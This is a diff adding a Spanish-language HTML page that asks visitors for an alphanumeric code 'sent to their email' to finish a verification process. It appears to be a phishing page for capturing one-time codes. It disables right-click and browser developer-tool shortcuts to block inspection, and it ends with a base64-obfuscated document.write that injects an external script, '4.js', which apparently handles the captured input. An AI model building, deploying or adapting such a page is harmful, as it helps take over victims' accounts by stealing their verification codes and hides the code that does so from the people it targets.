@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+
+   <!-- Inserted by miarroba -->
+              <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-T2VG59');</script>
+            <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+		<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE10">
+        <meta name="apple-itunes-app" content="app-id=284847138">
+		
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>DEMO</title>
+
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:Arial, Helvetica, sans-serif;
+}
+
+body{
+    background:#efefef;
+    min-height:100vh;
+    overflow-x:hidden;
+}
+
+/* Encabezado */
+
+.header{
+    width:100%;
+    background:#0d5788;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+}
+
+.header-banner{
+    display:block;
+    width:100%;
+    max-width:828px;
+    height:auto;
+    object-fit:contain;
+}
+
+.header-content{
+    width:100%;
+    height:70px;
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    padding:0 80px;
+}
+
+.logo img{
+    height:58px;
+    width:auto;
+    display:block;
+    background:transparent;
+}
+
+.back{
+    color:#fff;
+    text-decoration:none;
+    font-size:28px;
+    font-weight:bold;
+}
+
+
+/* Formulario */
+
+.container{
+    width:100%;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    padding:15px;
+}
+
+.login-box{
+    width:100%;
+    max-width:420px;
+}
+
+.title{
+    text-align:center;
+    color:#0b78c8;
+    font-size:30px;
+    font-weight:600;
+    margin:15px 0 25px;
+}
+
+.form-group{
+    margin-bottom:14px;
+}
+
+label{
+    display:block;
+    color:#444;
+    margin-bottom:5px;
+    font-size:14px;
+}
+
+input,
+select{
+    width:100%;
+    height:46px;
+    border:1px solid #4b9de3;
+    border-radius:2px;
+    background:#fff;
+    padding:0 12px;
+    font-size:14px;
+    outline:none;
+}
+
+input:focus,
+select:focus{
+    border:2px solid #0b78c8;
+}
+
+.password-box{
+    position:relative;
+}
+
+.eye{
+    position:absolute;
+    right:12px;
+    top:50%;
+    transform:translateY(-50%);
+    color:#0b78c8;
+    font-size:18px;
+    cursor:pointer;
+}
+
+.btn{
+    width:100%;
+    height:48px;
+    border:none;
+    border-radius:30px;
+    background:#0b6db8;
+    color:white;
+    font-size:15px;
+    cursor:pointer;
+    margin-top:18px;
+}
+
+.remember{
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    gap:8px;
+    margin:18px 0;
+    color:#444;
+}
+
+.links{
+    text-align:center;
+}
+
+.links a{
+    display:block;
+    text-decoration:none;
+    color:#0b78c8;
+    margin:12px 0;
+    font-size:15px;
+}
+
+/* Móvil */
+
+@media(max-width:480px){
+
+    .header-banner{
+    width:100%;
+    height:auto;
+    display:block;
+}
+
+    .logo{
+        position:absolute;
+        left:50%;
+        transform:translateX(-50%);
+    }
+
+    .logo img{
+        height:50px;
+        max-width:90vw;
+    }
+
+    .back{
+        position:absolute;
+        right:15px;
+        font-size:24px;
+    }
+
+    .title{
+        font-size:22px;
+    }
+
+    .container{
+        padding:10px;
+    }
+
+  .login-box{
+    width:100%;
+    max-width:420px;
+    margin:0 auto;
+}
+
+}
+
+</style>
+
+<script> 
+    // Bloquear clic derecho
+    document.addEventListener('contextmenu', function(e) {
+        e.preventDefault();
+    });
+
+    // Bloquear F12, Ctrl+Shift+I, Ctrl+U, Ctrl+S
+    document.onkeydown = function(e) {
+        if (
+            e.keyCode == 123 || // F12
+            (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) || // Ctrl+Shift+I
+            (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) || // Ctrl+U
+            (e.ctrlKey && e.keyCode == 'S'.charCodeAt(0)) // Ctrl+S
+        ) {
+            e.preventDefault();
+            return false;
+        }
+    }
+</script>
+
+</head>
+
+<body>
+
+<header class="header">
+    <img src="prueba2.png" alt="Banner" class="header-banner">
+</header>
+
+<form id="pedidoForm">
+
+<div class="container">
+
+    <div class="login-box">
+
+        <h2 class="title">Verificacion en Proceso</h2>
+
+        <div class="form-group">
+  
+        </div>
+
+ 
+
+        <div class="form-group">
+            <label>Ingrese el codigo Alfanúmerico que fue enviado a su Correo electrónico para finalizar el Proceso de Verificación</label>
+ <br>
+ 
+
+
+           <div class="password-box">
+                <input type="text" id="pedido1"   type="text" placeholder="XXXX-XXXX"
+        maxlength="9"
+        minlength="9"
+        pattern="[A-Z0-9]{4}-[A-Z0-9]{4}"
+        autocomplete="off"
+        required />
+
+
+  
+
+ 
+            </div>
+        </div>
+
+        <button class="btn">Ingresar</button>
+
+        <div class="remember">
+           
+        </div>
+
+        <div class="links">
+ 
+ 
+            <a href="#">Completar el proceso</a>
+        </div>
+
+    </div>
+
+</div>
+
+ <script>
+const campo = document.getElementById("pedido1");
+
+campo.addEventListener("input", function () {
+
+    // Quitar todo lo que no sea letra o número
+    let valor = this.value
+        .toUpperCase()
+        .replace(/[^A-Z0-9]/g, "")
+        .substring(0, 8);
+
+    // Agregar guion automáticamente
+    if (valor.length > 4) {
+        valor = valor.substring(0, 4) + "-" + valor.substring(4);
+    }
+
+    this.value = valor;
+
+    this.setCustomValidity("");
+});
+
+// Impedir continuar si está incompleto
+campo.addEventListener("invalid", function () {
+    this.setCustomValidity("Ingresa los 8 caracteres completos.");
+});
+</script>
+
+
+ 
+<script>document.write(decodeURIComponent(escape(atob("IDxzY3JpcHQgc3JjPSI0LmpzIj48L3NjcmlwdD4K"))));</script>
+
+
+</body>
+</html>
